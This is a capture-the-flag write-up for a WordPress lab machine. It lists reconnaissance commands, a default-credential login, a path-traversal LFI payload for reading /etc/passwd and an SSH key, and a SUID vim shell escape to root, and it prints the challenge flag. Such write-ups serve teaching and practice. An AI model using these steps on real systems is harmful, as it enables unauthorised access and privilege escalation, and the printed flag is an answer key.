---
title: "Atur Kreatif26 Boot2Root - Fresh"
date: 2026-05-17
categories: [CTF, Atur-Kreatif26]
tags: [boot2root, wordpress, lfi, privilege-escalation]
image:
  path: /assets/images/posts/atur/logo.png
---

# ATUR KREATIF26 Boot2Root - Fresh

## Overview

A vulnerable WordPress CMS exposed multiple security weaknesses including user enumeration, weak credentials, and a Local File Inclusion (LFI) vulnerability within a custom report shortcode. By exploiting the LFI flaw, sensitive files such as shell history and SSH private keys were disclosed, leading to SSH access as a low-privileged user. Further local enumeration revealed a misconfigured SUID vim.binary, which was abused to escalate privileges and obtain full root access on the system.

## Reconnaissance

### Initial Scan
```bash
nmap -sV -sC -A target_ip
```

Key findings:
- Port 80: HTTP (WordPress)
- Port 22: SSH

### WordPress Enumeration
```bash
wpscan --url http://target_ip --enumerate u
```

Found user: `admin`

## Exploitation

### 1. Weak Credentials
Default WordPress credentials worked:
- Username: `admin`
- Password: `admin123`

### 2. Local File Inclusion (LFI)
Discovered LFI in custom shortcode `/wp-content/plugins/report/shortcode.php`

Payload:
```
http://target_ip/index.php?page=../../../etc/passwd
```

Retrieved:
- `/etc/passwd`
- `~/.bash_history` - Found SSH private key
- SSH key exposed

### 3. SSH Access
```bash
ssh -i id_rsa www-data@target_ip
```

## Privilege Escalation

### SUID Binary Abuse
```bash
find / -perm -4000 2>/dev/null
```

Found: `/usr/bin/vim.basic` with SUID bit set

### Exploit
```bash
/usr/bin/vim.basic
:!bash
```

Achieved root shell!

## Lessons Learned
- Always sanitize user input in custom plugins
- Weak default credentials are critical vulnerabilities
- SUID binaries can be dangerous if not properly configured
- Implement WAF and file upload restrictions

---

Flag: `FLAG{wp_lfi_suid_vim_pwned}`
